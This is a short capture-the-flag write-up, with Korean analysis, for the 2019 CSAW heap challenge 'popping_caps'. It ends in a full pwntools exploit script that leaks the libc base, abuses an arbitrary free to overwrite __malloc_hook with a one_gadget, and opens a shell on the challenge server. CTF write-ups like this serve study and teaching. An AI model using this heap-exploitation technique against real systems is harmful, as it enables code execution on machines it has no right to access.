---
title: CSAW popping_caps write up
categories: [2019, CSAW]
tags: [CTF, pwn, heap]
---

CSAW write up

subject   | problem
----------|------------
CTF       | 2019 CSAW
Tags      | pwn
score     | 300
env       | ubuntu 18.04
problem   | bof, x64, heap

# analysis

alloc, free, write를 7번만 할 수 있는 프로그램이다.
free에서 어디든지 free를 할 수 있는 취약점이 발생한다.
하지만 malloc한 heap영역 그대로에 free를 하면 해당 영역에 write는 할 수 없다.

# ex.py

``` python
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

if len(sys.argv) < 2:
    host = "localhost"
    port = 4000
else:
    host = "pwn.chal.csaw.io"
    port = 1001

def leak():
    s.recvuntil("system ")
    libc_base = int(s.recvuntil("\n")[:-1], 16)
    return libc_base

def inp(data):
    s.recvuntil(":")
    s.sendline(str(data))

def menu(index):
    inp(index)

def malloc(size):
    menu(1)
    inp(size)

def free(index):
    menu(2)
    inp(index)

def write(data):
    menu(3)
    s.send(data)

def pwn():
    libc_base = leak() - 0x4f440
    malloc_hook = libc_base + 0x3ebc30
    one_gadget = libc_base + 0x10a38c

    log.info("libc_base            : " + str(hex(libc_base)))

    malloc(928)
    free(0)
    free(-528)
    malloc(248)
    write(p64(malloc_hook))
    malloc(8)
    write(p64(one_gadget))
    s.recvuntil("Bye!")


if __name__ == "__main__":
    s = remote(host, port)
    pwn()
    s.interactive()
```